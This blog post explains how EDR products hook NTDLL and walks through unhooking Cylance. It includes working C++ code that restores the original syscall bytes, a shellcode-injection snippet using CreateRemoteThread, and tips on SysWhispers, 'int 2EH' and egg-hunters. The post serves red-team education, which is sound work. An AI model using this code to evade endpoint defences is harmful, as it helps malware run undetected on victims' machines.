# How Does AV Know?
Have you ever wondered how AV knows what that the application you're trying to run is malicious when it doesn't have a known signature?
NTDLL is the answer.

![NTDLL](/assets/img/ntdll/proc-loading.png)

# Before we begin
It's the first post on the new website, and we finally can include Markdown code blocks! No more screenshots of code! 
Blogger has served its purpose well, but it's finally time to move on to more adaptable hosting options. 
With that out of the way, the first post on the new site is going to be talking about a very common EDR evasion techniques and how to spot it.
This is something that has been discussed a lot before and probably won't be new to many, but even in 2022 it's still overlooked by EDR vendors, so it's worth going over.

## What is NTDLL?
In the simplest form, it exports the Windows Native API. 
Since it would be incredibly insecure to allow user mode applications direct access to manipulate the kernel, Windows instead allows you to interact with it through the Native API which is then mapped to Syscalls.
These Syscalls then are mapped via the system service descriptor table (SSDT) to the kernel functions memory address.
Things like WriteProcessMemory or CreateRemoteThread all go through here and have their own NT API equivalent - NtWriteVirtualMemory and NtCreateThreadEx respectively.
Then, once they have found their API equivalent call, the memory location that the loaded copy of NTDLL has is referenced.
And yes! You can completely avoid having to use these exported functions by just using the Syscalls instead, i.e. Syswhispering.
This comes with its own challenges though when manually implemented as these Syscall numbers reference different memory addresses in the system service descriptor table with each update.
So if you want to avoid NTDLL and use Syscalls, use Syswhisper - it cuts out the headaches and figures out the correct memory address for you.

## How does AV hook NTDLL?
As indicated above, NTDLL is used for a bunch of internal actions so, for the EDR, setting interrupt points to examine what kind of API requests are being made is critical.
Your typical EDR will modify the loaded version to allow it to send off suspicious function calls, such as below with CreateRemoteThread.
![EDR Jump Point](https://www.mdsec.co.uk/wp-content/uploads/2019/03/9797A6D5-B1D8-4E1C-924D-797035C0A3D9-1024x123.png "https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/")

In this screenshot provided by MDSec, Cylance has implemented a jump point for this function call so that it can inspect what exactly is being performed before passing it back to the original process.
EDR will typically do this for every function that can be abused. But each EDR is built differently so while Cylance might have this jmp here, perhaps Crowdstrike does not. Just something to keep in mind.


## Unhooking for fun and profit
We know what NTDLL is and how it's used and we also know how EDR puts jump points into it in order to examine suspicious calls. 
The next step after this is how can we defeat this process? 

```cpp
void removeCylanceHook(const char* dll, const char* apiName, char code) {
    DWORD old, newOld;
    void* procAddress = GetProcAddress(LoadLibraryA(dll), apiName);
    printf("[*] Updating memory protection of %s!%s\n", dll, apiName);
    VirtualProtect(procAddress, 10, PAGE_EXECUTE_READWRITE, &old);
    printf("[*] Unhooking Cylance\n");
    memcpy(procAddress, "\x4c\x8b\xd1\xb8", 4);
    *((char*)procAddress + 4) = code;
    VirtualProtect(procAddress, 10, old, &newOld);
} 
```
The above snippet is taken from MDSec [here](https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/).
The key part to highlight is you can see there is a new value being copied to a memory location.
Here they are overwriting this process address with the original bytes pointing to the kernel functions memory address.
Every memory address exported from the Native API in fact will start with these bytes. 
After implementing this, when the application continues execution, it will no longer have a jump instruction to Cylance's analysis.

```cpp
printf("[*] Opened target process %d\n", processID);
printf("[*] Allocating memory in target process with VirtualAllocEx\n");
void *alloc = VirtualAllocEx(proc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (alloc == (void*)0) {
    printf("[!] Error: Could not allocate memory in target process\n");
    return 1;
}
printf("[*] Allocated %d bytes at memory address %p\n", sizeof(buf), alloc);
printf("[*] Attempting to write into victim process using WriteProcessMemory\n");
if (WriteProcessMemory(proc, alloc, buf, sizeof(buf), NULL) == 0) {
    printf("[!] Error: Could not write to target process memory\n");
    return 1;
}
printf("[*] WriteProcessMemory successful\n");

// Remove the NTDLL.DLL hook added by userland DLL
removeCylanceHook("ntdll.dll", "ZwCreateThreadEx", 0xBB);
printf("[*] Attempting to spawn shellcode using CreateRemoteThread\n");
HANDLE createRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
printf("[*] Success :D\n");
```
When this is run, before getting to the CreateRemoteThread function, the application calls the aforementioned removeCylanceHook function with the API name for ZwCreateThreadEx.
The Zw prefix here is important as this ensures that the kernel mode variant for the function is overwritten to point away from the injected EDR jump, whereas specifying Nt would not have done.
So now when our application hits the CreateRemoteThread call, it asks the loaded copy of NTDLL to pass on the request to the SSDT that now has the hook for Cylance removed and functions normally.

## Pros & Cons
So why go through all this work when Syswhisper makes it far simpler?
Well, as [Captmeelo found](https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html), EDR could be looking for the ```syscall``` instruction in the binary. 
A simple bypass though in this case is to replace ```syscall``` in the asm file of Syswhisper with ```int 2EH``` which is a legacy instruction for referencing kernel mode. 
*However* this **also** has issues. ```int 2EH``` is trivial to hunt for so now we're entering the territory of adding an [egg-hunter](https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/) to the code in order to find and replace items in memory at run time.
We'd replace ```syscall``` with a random string in the Syswhispers asm file and then at run time implement the egg-hunter to change our previously random string to ```syscall```.
This definitely provides a high level of evasion, but you have to weigh the cost in time versus the advantage gained.

***References***
> https://www.codeproject.com/Articles/1191465/The-Quest-for-the-SSDTs
> 
> https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/
> 
> https://www.geoffchappell.com/studies/windows/win32/ntdll/api/index.htm
> 
> https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/
> 
> https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis
> 
> https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html
> 
> https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/
> 
> https://rioasmara.com/2021/06/20/25-bytes-of-every-function-in-ntdll/